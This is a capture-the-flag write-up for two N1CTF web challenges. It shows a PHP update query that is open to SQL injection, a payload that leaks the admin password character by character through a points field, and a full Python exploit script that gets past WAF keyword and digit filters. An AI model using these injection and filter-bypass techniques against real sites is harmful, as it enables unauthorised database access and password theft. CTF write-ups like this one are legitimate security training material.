# 77777

This site has a logic like below

```php
$flag = $_POST['flag'];
$hi = $_POST['hi'];
$query = sprintf("UPDATE users SET points=%d%s", $flag, waf($hi));
mysqli_query($query);
```

Our target is get ``admin's password``, after post our request, we can access ``#profile`` to see points. 

So it's easy to solve, just let ``flag=0`` and ``hi=+ord(substr((select password), %d, 1))``, we can get password from points.

Finally, flag is ``N1CTF{helloctfer23333}``

# 77777 2

New challenge is similar with challenge 1, but ``waf`` disable more keywords, such as ``ord`` / digit ``[2-59]`` / ``(select pw)``.

We can use ``conv`` and ``hex`` to bypass ``ord``, and ``+1+1`` to bypass digit limit, and ``(select pw )`` bypass ``(select pw )``


Whole exploit is

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.main import Saker

class Cli(Saker):

    def __init__(self, url):
        super(Cli, self).__init__(url)

    def up(self, flag, hi):
        data = {
            "flag": flag,
            "hi": hi,
        }
        self.post(self.url, data=data)
        if "hacker" in self.lastr.content:
            print "hacker", hi
            return ""
        else:
            # print hi, "ok"
            points = self.lastr.content.split("</grey> | ")[1]
            points = points.split("<br/>")[0]
            try:
                return chr(int(points))
            except Exception as e:
                return " "


def sstr(i):
    num = str(i)
    for k in "23459":
        if k in num and i < 20:
            num = num.replace(k, "1" + "+1" * (int(k) - 1))
        elif i >= 20 and i < 26:
            num = "10+10" + "+1" * (i%10)
        elif i >= 20 and i < 29:
            num = "10+10+" + str(i%10)
        elif i == 29:
            num = "10+10+10-1"
        elif i >= 30 and i < 40:
            num = "10+10+10" + "+1" * (i%10)
    return num


if __name__ == '__main__':
    url = "http://47.52.137.90:20000/index.php"  # site url
    c = Cli(url)
    x = ""
    for i in range(1, 40):
        x+=c.up("0", "+conv(hex(substr((select pw ), %s, 1)), 16, 10)" % sstr(i))
        print x
```

Finally, flag is ``N1CTF{hahah777a7aha77777aaaa}``
